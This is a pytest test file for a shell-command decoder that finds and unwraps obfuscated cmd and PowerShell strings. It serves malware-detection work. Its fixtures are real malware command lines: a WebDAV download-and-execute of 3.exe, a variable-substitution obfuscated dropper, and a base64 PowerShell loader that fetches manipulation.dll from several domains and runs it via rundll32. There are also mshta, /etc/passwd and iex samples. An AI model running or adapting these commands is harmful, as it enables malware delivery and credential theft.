import pytest
import regex as re

from multidecoder.decoders.shell import (
    CMD_RE,
    find_cmd_strings,
    find_powershell_strings,
    get_cmd_command,
    get_powershell_command,
    strip_carets,
)
from multidecoder.node import Node

test = b"SET.NAME(a , cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html)"


# CMD_RE
@pytest.mark.parametrize(
    "data",
    [
        b"",
        b"CmDF",
    ],
)
def test_cmd_re_not_match(data: bytes):
    assert not re.search(CMD_RE, data)


@pytest.mark.parametrize(
    "data",
    [
        b"cmd arguments",
        b"CmD ArgUmenTs",
        b"c^m^d c^omman^d",
        b'cmd /c ""echo bee""',
    ],
)
def test_cmd_re_match(data: bytes):
    assert re.match(CMD_RE, data)


def test_cmd_re_null():
    match = re.match(CMD_RE, b"cmd.exe\x00somethingelse")
    assert match
    assert match.span() == (0, 7)


def test_cmd_re_ex1():
    match = re.search(CMD_RE, test)
    assert match
    assert test[match.start() : match.end()] == b"cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html)"


# strip_carets
@pytest.mark.parametrize(
    ("data", "expected"),
    [
        (b"", b""),
        (b"test", b"test"),
        (b"^", b""),
        (b"^^", b"^"),
        (b"test^", b"test"),
        (b'"^"', b'"^"'),
        (b"start^\r\nend", b"startend"),
        (b'"test"" ^', b'"test"" ^'),
    ],
)
def test_strip_carets(data: bytes, expected: bytes):
    assert strip_carets(data) == expected


# find_cmd_strings
def test_find_cmd_strings():
    assert find_cmd_strings(test) == [
        Node(
            type_="shell.cmd",
            value=b"cmd /c mshta http://some.url/x.html",
            start=13,
            end=55,
            obfuscation="unescape.shell.carets",
        )
    ]


def test_find_cmd_strings_with_combo_of_ps1_and_cmd():
    ex = b"powershell -Command curl blah.com && cmd /c curl https://abc.org && powershell -Command cat /etc/passwd"
    assert find_cmd_strings(ex) == [
        Node(
            type_="shell.cmd",
            value=b"cmd /c curl https://abc.org && powershell -Command cat /etc/passwd",
            start=37,
            end=103,
        )
    ]


@pytest.mark.parametrize(
    "cmd",
    [
        (
            # From c8004f944055296f2636a64f8a469b9db6c9e983305f83ddc50c0617950d2271
            b'"C:\\WINDOWS\\system32\\cmd.exe" /c "net use Q: https://webdav.4shared.com dE}9tBDaFK\'Y%%uv '
            b"/user:lasex69621@cohodl.com & type \\\\webdav.4shared.com@SSL\\aa\\3.exe > 3.exe & forfiles /p "
            b'c:\\windows\\system32 /m notepad.exe /c %%cd%%/3.exe  & net use * /d /y"'
        ),
        (
            # From 01446c36f93532f2cd8af96396e22086f37aef1bb8e68b3b03076c9da5ec9737
            b'"C:\\WINDOWS\\system32\\cmd.exe" /v /c "set "7QJlqI5k=wrnNUlRKetsTzM" '
            b'&& call set "0j0kF9ei=!7QJlqI5k:~10,1!et" && !0j0kF9ei! "CWUz=t" &&!0j0kF9ei! "kAoe=m" &&'
            b'!0j0kF9ei! "KxCF=%" &&!0j0kF9ei! "eOTw=i" &&!0j0kF9ei! "Upvl=e" &&!0j0kF9ei! "bntB=4" &&!0j0kF9ei! "PbiW=u" '
            b'&&!0j0kF9ei! "RDvi=n" &&!0j0kF9ei! "swJc=x" &&!0j0kF9ei! "fqvE=a" &&!0j0kF9ei! "duPA=l" &&!0j0kF9ei!'
            b' "yYGa=p" &&!0j0kF9ei! "ozfF=." &&!0j0kF9ei! "yqwP=f" &&!0j0kF9ei! "bnwz=[" &&!0j0kF9ei! "AAVs=r" '
            b'&&!0j0kF9ei! "HUXA=s" &&!0j0kF9ei! "TRHb=o" &&!0j0kF9ei! "jJxO=]" &&!0j0kF9ei! "euru=g" &&!0j0kF9ei! '
            b'"LzmN=d" &&!0j0kF9ei! "ETOj=w" &&!0j0kF9ei! "DePj=$" &&!0j0kF9ei! "KHMe=A" &&!0j0kF9ei! "xJuY=E" '
            b'&&!0j0kF9ei! "vyxK==" &&!0j0kF9ei! "zCOe=0" &&!0j0kF9ei! "qEyT=1" &&!0j0kF9ei! "yPRu=7" &&!0j0kF9ei! '
            b'"NXuW=U" &&!0j0kF9ei! "XBrv=O" &&!0j0kF9ei! "AQAM=C" &&!0j0kF9ei! "ADgJ=X" &&!0j0kF9ei! "efpU=D" '
            b'&&!0j0kF9ei! "lGTl=F" &&!0j0kF9ei! "FPxK=j" &&!0j0kF9ei! "RfYF=R" &&!0j0kF9ei! "VWtg=c" &&!0j0kF9ei! '
            b'"qZpa=5" &&!0j0kF9ei! "ijwe=," &&!0j0kF9ei! "bIbp=I" &&!0j0kF9ei! "bboR=W" &&!0j0kF9ei! "CJhg=:" '
            b'&&!0j0kF9ei! "EwIP=k" &&!0j0kF9ei! "GMSj=2" &&!0j0kF9ei! "csVL=3" &&!0j0kF9ei! "dCLG=b" &&!0j0kF9ei! '
            b'"rzSk=8" &&!0j0kF9ei! "vyxM=v" &&!0j0kF9ei! "vdCD=\'" &&!0j0kF9ei! "BdIj=P" &&!0j0kF9ei! "RBjV=h" '
            b'&&!0j0kF9ei! "FKko=Q" &&!0j0kF9ei! "peOc=/" &&!0j0kF9ei! "vgth=G" &&!0j0kF9ei! "GyGT=T" &&!0j0kF9ei! '
            b'"sHzK=M" &&!0j0kF9ei! "mSxW=y" &&!0j0kF9ei! "wasV=S" &&c!fqvE!l!duPA! !0j0kF9ei! '
            b'"de1R8TKC=%!CWUz!!kAoe!p!KxCF!\\!eOTw!!Upvl!!bntB!!PbiW!!eOTw!!RDvi!!eOTw!!CWUz!.!Upvl!!swJc!e" '
            b'&& c!fqvE!!duPA!!duPA! !0j0kF9ei! "6vIlvFDq=%t!kAoe!!yYGa!%\\!eOTw!!Upvl!!PbiW!!eOTw!!RDvi!!eOTw!t!ozfF!'
            b'!eOTw!n!yqwP!" && (for %t in ("!bnwz!v!Upvl!!AAVs!!HUXA!!eOTw!!TRHb!!RDvi!!jJxO!" "!HUXA!!eOTw!!euru!!RDvi!'
            b'!fqvE!!CWUz!u!AAVs!e = $w!eOTw!!RDvi!!LzmN!o!ETOj!s nt!DePj!" "!bnwz!!LzmN!e!HUXA!ti!RDvi!a!CWUz!i!TRHb'
            b'!!RDvi!!LzmN!!eOTw!!AAVs!!HUXA!]" "!KHMe!!bntB!5!xJuY!!vyxK!!zCOe!!qEyT!" "[!LzmN!!Upvl!f!fqvE!!PbiW!l!CWUz'
            b'!!eOTw!n!HUXA!tal!duPA!!ozfF!w!eOTw!n!LzmN!ow!HUXA!!yPRu!!jJxO!" "!NXuW!nR!Upvl!!euru!i!HUXA!!CWUz!e!AAVs'
            b'!!XBrv!!AQAM!!ADgJ!s!vyxK!F0!yPRu!F!efpU!" "d!Upvl!!duPA!!yqwP!i!duPA!!Upvl!s!vyxK!!KHMe!45!xJuY!" "!bnwz'
            b'!!lGTl!!zCOe!7!lGTl!!efpU!!jJxO!" "!KxCF!!FPxK!!RfYF!M!yPRu!!LzmN!%!KxCF!!qEyT!!qEyT!%\\s!VWtg!!KxCF!!qZpa'
            b"!FSP!efpU!%!ijwe!N!bIbp!!ijwe!h!CWUz!!KxCF!!yYGa!!bntB!I!yqwP!!bboR!!KxCF!!CJhg!!KxCF!!yqwP!hwQ!EwIP!%!yPRu"
            b'!!GMSj!.!qZpa!!ozfF!!bntB!!csVL!.!qEyT!9/!AAVs!o!dCLG!o!CWUz!in!euru!!ozfF!!KxCF!!CWUz!!rzSk!GcT!KxCF!" '
            b'"!bnwz!A!bntB!!qZpa!!xJuY!!jJxO!" "!eOTw!!Upvl!!PbiW!!eOTw!!RDvi!!KxCF!!KHMe!y!eOTw!!PbiW!!RfYF!!KxCF!!RDvi'
            b'!!yqwP!" "!bnwz!str!eOTw!!RDvi!!euru!!HUXA!!jJxO!" "!HUXA!e!AAVs!!vyxM!i!VWtg!en!fqvE!!kAoe!!Upvl!!vyxK'
            b'!!vdCD! \'" "!HUXA!h!TRHb!!AAVs!!CWUz!!HUXA!!vyxM!c!RDvi!am!Upvl!!vyxK!\' \'" "!qZpa!FS!BdIj!!efpU!!vyxK!R!'
            b'TRHb!!dCLG!!FPxK!" "p!bntB!I!yqwP!!bboR!!vyxK!tp" "!yqwP!!RBjV!w!FKko!!EwIP!!vyxK!/!peOc!" "!CWUz!!rzSk'
            b'!!vgth!c!GyGT!!vyxK!!yYGa!h!yYGa!" "!FPxK!!RfYF!!sHzK!!yPRu!!LzmN!=" "!KHMe!!mSxW!!eOTw!u!RfYF!=!eOTw!!CWUz'
            b'!!ozfF!i" ) do @e!VWtg!!RBjV!o %~t)> "!6vIlvFDq!" && call c!TRHb!!yYGa!!mSxW! /Y %!ETOj!!eOTw!!RDvi!d!eOTw'
            b"!!AAVs!%\\!wasV!!mSxW!!HUXA!t!Upvl!!kAoe!3!GMSj!\\!eOTw!!Upvl!4!PbiW!i!RDvi!!eOTw!!CWUz!!ozfF!!Upvl!x!Upvl! "
            b'%!CWUz!!kAoe!!yYGa!%\\ && s!CWUz!!fqvE!!AAVs!t "" /m!eOTw!!RDvi! "!de1R8TKC!" -!dCLG!!fqvE!!HUXA!!Upvl!!HUXA'
            b'!!Upvl!!CWUz!!CWUz!!eOTw!n!euru!!HUXA!"'
        ),
    ],
)
def test_find_cmd_strings_with_dynamic_cmd(cmd: bytes):
    assert find_cmd_strings(cmd) == [
        Node(
            type_="shell.cmd",
            value=cmd,
            start=0,
            end=len(cmd),
        )
    ]


# find_powershell_strings
@pytest.mark.parametrize(
    "data",
    [
        b"",
        b"supported Powershell version",
        b"Azure powershell module",
    ],
)
def test_find_powershell_strings_fp(data):
    assert find_powershell_strings(data) == []


def test_find_powershell_strings_enc():
    ex = b"powershell /e ZQBj^AGgAbwAgAGIAZQ^BlAA=="
    assert find_powershell_strings(ex) == [
        Node(
            type_="shell.cmd",
            value=b"powershell /e ZQBjAGgAbwAgAGIAZQBlAA==",
            obfuscation="unescape.shell.carets",
            start=0,
            end=len(ex),
            children=[
                Node(
                    "shell.powershell",
                    b"powershell -Command echo bee",
                    "powershell.base64",
                    0,
                    28,
                )
            ],
        )
    ]


def test_find_powershell_strings_enc_with_quotes():
    ex = b'powershell/e "ZQBjAGgAbwAgAGIAZQBlAA=="'
    assert find_powershell_strings(ex) == [
        Node(
            type_="shell.powershell",
            value=b"powershell -Command echo bee",
            obfuscation="powershell.base64",
            start=0,
            end=len(ex),
        )
    ]


def test_find_powershell_strings_carets():
    ex = b'    ^p^o^w^e^r^s^h^e^l^l^ ^-^e^ ^"^Z^Q^B^j^A^G^g^A^b^w^A^g^A^G^I^A^Z^Q^B^l^A^A^=^=^"'
    assert find_powershell_strings(ex) == [
        Node(
            type_="shell.cmd",
            value=b'powershell -e "ZQBjAGgAbwAgAGIAZQBlAA=="',
            obfuscation="unescape.shell.carets",
            start=4,
            end=len(ex),
            children=[
                Node(
                    "shell.powershell",
                    b"powershell -Command echo bee",
                    "powershell.base64",
                    0,
                    28,
                )
            ],
        )
    ]


def test_find_powershell_for_loop():
    ex = (
        b'for /f "tokens=*" %%a in (\'powershell -Command "hostname '
        b"| %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"') do echo prx.%%a"
    )
    assert find_powershell_strings(ex) == [
        Node(
            type_="shell.powershell",
            value=b"powershell -Command \"hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"",
            obfuscation="",
            start=27,
            end=96,
        )
    ]


def test_find_powershell_strings_invoke_expression():
    ex = b"Invoke-Expression 'PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1'"
    assert find_powershell_strings(ex) == [
        Node(
            type_="shell.powershell",
            value=b"PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1",
            obfuscation="",
            start=19,
            end=len(ex) - 1,
        )
    ]


def test_find_powershell_strings_from_dynamic_command():
    ex = (
        b'"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -encodedcommand '
        b'"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7ACQAUABvAGwAeQBuAG8AbQBpAGEAbABpAHMAdABBAG4AZwB'
        b"sAGkAYwBpAHoAZQBzACAAPQAgACgAIgBoAHQAdABwAHMAOgAvAC8AZQBkAHMAZQBuAGUAegBhAGwAdQBtAGkAbgB1AG0ALgBjAG8AbQAvAE8"
        b"AUABHAC8ANABhAFQAOAB2AHcALABoAHQAdABwAHMAOgAvAC8AeQBlAGwAbABvAHcAaABhAHQAZwBsAG8AYgBhAGwALgBjAG8AbQAvAEcAMQB"
        b"SAFcALwBpAGsAdgBvAHEAbQBpADcASgBzAGwALABoAHQAdABwAHMAOgAvAC8AYQB3AGEAaQBzAGQAYQBuAGkAcwBoAC4AYwBvAG0ALwBOAG4"
        b"AUgBVAC8AaABwAHQAUwBKAHYALABoAHQAdABwAHMAOgAvAC8AYQB2AGEAaQBsAGEAYgBsAGUAYwBsAGUAYQBuAGUAcgAuAGMAbwBtAC8AdwB"
        b"oAGcAaQBvAC8ASgBmAHEAeABiAFoAdwBQADEAWQBEACwAaAB0AHQAcABzADoALwAvAGUAbgBnAHYAaQBkAGEALgBjAG8AbQAuAGIAcgAvAHI"
        b"ATABtAC8AYwBmAEsAeQBIAEoAeQB2AGgAMgAsAGgAdAB0AHAAcwA6AC8ALwB1AGIAbQBoAGEAaQB0AGkALgBvAHIAZwAvAHQAaABRADYATAA"
        b"vAG8ARgBMAE8AZQBqAEoAcgBHACIAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBmAG8AcgBlAGEAYwBoACAAKAAkAHQAYQB1AHQAbwBsAG8"
        b"AZwBpAHoAZQBkACAAaQBuACAAJABQAG8AbAB5AG4AbwBtAGkAYQBsAGkAcwB0AEEAbgBnAGwAaQBjAGkAegBlAHMAKQAgAHsAdAByAHkAIAB"
        b"7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACQAdABhAHUAdABvAGwAbwBnAGkAegBlAGQAIAAtAFQAaQBtAGUAbwB1AHQ"
        b"AUwBlAGMAIAAxADgAIAAtAE8AIAAkAGUAbgB2ADoAVABFAE0AUABcAG0AYQBuAGkAcAB1AGwAYQB0AGkAbwBuAC4AZABsAGwAOwBpAGYAIAA"
        b"oACgARwBlAHQALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABtAGEAbgBpAHAAdQBsAGEAdABpAG8AbgAuAGQAbABsACkALgBsAGU"
        b"AbgBnAHQAaAAgAC0AZwBlACAAMQAwADAAMAAwADAAKQAgAHsAcwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQB"
        b"NAFAAXABcAG0AYQBuAGkAcAB1AGwAYQB0AGkAbwBuAC4AZABsAGwALABHAEwANwAwADsAYgByAGUAYQBrADsAfQB9AGMAYQB0AGMAaAAgAHs"
        b'AUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7AH0AfQA="'
    )
    assert find_powershell_strings(ex) == [
        Node(
            type_="shell.powershell",
            value=(
                b"powershell.exe -Command Start-Sleep -Seconds 4;$PolynomialistAnglicizes = "
                b'("https://edsenezaluminum.com/OPG/4aT8vw,https://yellowhatglobal.com/G1RW/ikvoqmi7Jsl,'
                b"https://awaisdanish.com/NnRU/hptSJv,https://availablecleaner.com/whgio/JfqxbZwP1YD,"
                b'https://engvida.com.br/rLm/cfKyHJyvh2,https://ubmhaiti.org/thQ6L/oFLOejJrG").split(",");'
                b"foreach ($tautologized in $PolynomialistAnglicizes) {try {Invoke-WebRequest $tautologized "
                b"-TimeoutSec 18 -O $env:TEMP\\manipulation.dll;if ((Get-Item $env:TEMP\\manipulation.dll).length "
                b"-ge 100000) {start rundll32 $env:TEMP\\\\manipulation.dll,GL70;break;}}"
                b"catch {Start-Sleep -Seconds 4;}}"
            ),
            obfuscation="powershell.base64",
            start=44,
            end=1658,
        ),
    ]


def test_find_powershell_strings_with_combo_of_ps1_and_cmd():
    ex = b"powershell -Command curl blah.com && cmd /c curl https://abc.org && powershell -Command cat /etc/passwd"
    assert find_powershell_strings(ex) == [
        Node(
            type_="shell.powershell",
            value=(
                b"powershell -Command curl blah.com && cmd /c curl https://abc.org && "
                b"powershell -Command cat /etc/passwd"
            ),
            start=0,
            end=103,
        ),
        Node(
            type_="shell.powershell",
            value=b"powershell -Command cat /etc/passwd",
            start=68,
            end=35,
        ),
    ]


# get_cmd_command
def test_get_cmd_command_empty():
    assert get_cmd_command(b"") == b""


def test_get_cmd_command_c():
    assert get_cmd_command(b"cmd/ccommand") == b"command"
    assert get_cmd_command(b"cmd.exe/ccommand") == b"command"


def test_get_cmd_command_k():
    assert get_cmd_command(b"cmd/kcommand") == b"command"
    assert get_cmd_command(b"cmd.exe/kcommand") == b"command"


def test_get_cmd_command_r():
    assert get_cmd_command(b"cmd/rcommand") == b"command"
    assert get_cmd_command(b"cmd.exe/rcommand") == b"command"


def test_get_cmd_command_amp():
    assert get_cmd_command(b"cmd&command&command2&command3") == b"command&command2&command3"


def test_get_cmd_command_upper():
    assert get_cmd_command(b"CMD/CCOMMAND") == b"COMMAND"
    assert get_cmd_command(b"CMD/KCOMMAND") == b"COMMAND"


def test_get_cmd_command_nested():
    assert get_cmd_command(b"cmd /c cmd /c command") == b"cmd /c command"
    assert get_cmd_command(b"cmd /c cmd /k command") == b"cmd /k command"
    assert get_cmd_command(b"cmd /k cmd /c command") == b"cmd /c command"
    assert get_cmd_command(b"cmd /k cmd /k command") == b"cmd /k command"


def test_get_cmd_command_strip_quotes():
    assert get_cmd_command(b'cmd /c   "command"') == b"command"


def test_get_cmd_command_last_quote_only():
    assert get_cmd_command(b'cmd /c "comm"an"d') == b'comm"and'


def test_get_cmd_command_strip_only_if_first_quote():
    assert get_cmd_command(b'cmd /c command"') == b'command"'


# get_powershell_command
def test_get_powershell_command_empty():
    assert get_powershell_command(b"") == b""


def test_get_powershell_command_bare():
    assert get_powershell_command(b"powershell command") == b"command"
    assert get_powershell_command(b"pwsh command") == b"command"


def test_get_powershell_command_exe():
    assert get_powershell_command(b"powershell.exe command") == b"command"
    assert get_powershell_command(b"pwsh.exe command") == b"command"


def test_get_powershell_command_args():
    assert get_powershell_command(b"powershell -arg1 -arg2 command") == b"command"


def test_get_powershell_command_quotes():
    assert (
        get_powershell_command(
            b"powershell.exe -c \"&{'p8ArwZsj8ZO+Zy/dHPeI';$BxQ='<base64content>';$KOKN='<base64content>';$KOKN=$KOKN+$BxQ;$GBUus=$KOKN;$xCyRLo=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($GBUus));$GBUus=$xCyRLo;iex($GBUus)}\""
        )
        == b"&{'p8ArwZsj8ZO+Zy/dHPeI';$BxQ='<base64content>';$KOKN='<base64content>';$KOKN=$KOKN+$BxQ;$GBUus=$KOKN;$xCyRLo=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($GBUus));$GBUus=$xCyRLo;iex($GBUus)}"
    )
